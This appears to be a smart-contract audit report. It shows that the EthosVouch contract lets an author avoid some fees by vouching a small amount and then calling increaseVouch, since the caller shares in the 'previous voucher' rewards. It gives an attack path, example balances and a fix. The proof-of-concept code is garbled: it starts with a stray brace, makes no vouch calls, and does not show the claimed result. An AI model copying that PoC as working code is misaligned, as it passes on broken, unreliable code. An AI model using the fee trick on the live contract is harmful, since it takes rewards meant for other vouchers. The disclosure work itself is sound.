# Author can bypass some fees by calling vouch and then increaseVouch.

### Summary

Whenever an author vouches for a `profileId` , a certain amount of fees is given to previous vouchers as reward. The same thing happens when author calls increaseVouch. 
But whenever an author calls increaseVouch then they also gets a part of fees as reward since they are also a part of previous vouchers. 

That means an author can get a part of fees during the process and can thereby avoid paying more fees. 

### Root Cause

Let's take a look on these  2 functions 
1. vouchByProfileId
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/EthosVouch.sol#L330-L415

2. increaseVouch
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/EthosVouch.sol#L426-L444


Both these functions have one function in commons which is `applyFees` 
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/EthosVouch.sol#L929-L965

Inside of this function we have `_rewardPreviousVouchers` that takes a fee cut from the amount given by author through these 2 functions and provide that to previous vouchers. 
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/EthosVouch.sol#L697-L739

The amount of reward that will go to previous vouchers is based on this formula 

```Solidity
reward = amount.mulDiv(vouch.balance, totalBalance, Math.Rounding.Floor);
```
Where vouch.balance is the amount that was vouched by previous vouched and totalBalance is sum of all vouch.balance of all vouchers. 
We can simplify this with a formula 
reward = ( amount * balance ) / totalBalance

Same thing happens when `increaseVouch` is called. But during this process, the author who is calling this function is also a part of previous vouchers because in order to increase your vouch , you need to be a voucher in first place. That means a part of reward will also goes to the caller of `increaseVouch` 

This also means that calling `vouchByProfileId` with a certain amount will result in more fees given than calling `vouchByProfileId` with a relatively small amount and then calling `increaseVouch` with remaining amount because the caller will also be able to get a part of that fees. 

In short `_rewardPreviousVouchers will also consider the current caller of increaseVouch as a part of previous voucher and will give some reward to the caller's balance`

The amount of money an author will avoid will depend upon 
 vouchAmount paid relative to other vouchers : If an author is about to vouch an amount that is higher than others then it's better to vouch for amount relatively equal to others ( to get a good amount of rewards ) and then increaseVouch. for example , vouches are for 10 ether and author need to vouch for 50 ether. 

Suppose we have 3 authors and author3 needs to vouch for 50 ether while other author has a vouch for 10 ether. 
then 

Case1 : author vouch for 50 ether 
final balance : [10.4 , 9.8 , 45.6 ] // In POC 

Case2 : author vouch for 10 ether and then increase vouch for 40
final balance : [10.2, 9.6, 46 ] // In POC


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. author needs to vouch on a profile id with some ether.
2. Instead of calling `vouchByProfileId` with that entire amount, the author first calls `vouchByProfileId` with a small amount and then calls `increaseVouch` with the rest of the amount. 
This way, author was able to save some fees by getting a share of fees that was intended to be given for previous vouchers. 

### Impact

The author was able to get a share of reward that was intended to be given to previous vouchers thereby saving some fees. 

In order for this to be medium it should hold true for these statements :
> 1. Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss must be relevant to the affected party.
> 2. Users lose more than 0.01% and more than $10 of their yield.
> 3. The protocol loses more than 0.01% and more than $10 of the fees.

Bypassing any amount of fees should be considered a valid medium since the amount is more than 0.01% of the fees. 

### PoC

Since I have made some certain changes in the setup , I am providing the changed contract in the gist below. 

https://gist.github.com/Pheonix244001/30979314020247f92d00228e14b1422d


There are 2 things that I have done in the contract to make the poc easier to run without any setup 
1. remove upgrade logic 
2. remove profile fetching and added 2 function at the last that will fetch the profile instead. This way, I don't have to rely on ContractAddressManager.sol and EthosProfile.sol to fetch profile id. 

Also, here is the link for diffchecker where I have added original contract and changed contract :
https://www.diffchecker.com/gX9cG5vB/ ( EthosVouch.sol ) 
https://www.diffchecker.com/bsikUUKp/ ( AccessControl.sol , removed onlyInitializing modif )
https://www.diffchecker.com/sAMg0Pg0/ ( SignatureControl.sol , commented update signature func )

Here's the final poc

    }

    function testVouchComplete() public {
        // author 1, 2  will vouch for 10 ether and author3 will vouch for 50 ether
        vm.prank(author1);

        ethosvouch.vouches(1); // 9.8 ether
        ethosvouch.vouches(2); //45.6 ether
    }

} 
```
If you run these test by typing `forge test -vvvvv` and check balance value of ethosvouch.vouches() , you will see all the differences of balance. The values are also written as comments above. 

As you can see, author3 was able to save 0.4 ether in this poc by vouching for 10 ether and then increasing it by 40 instead of vouching for 50 at the start. 


### Mitigation

Do not consider msg.sender as a part of previous voucher when they are calling `increaseVouch`
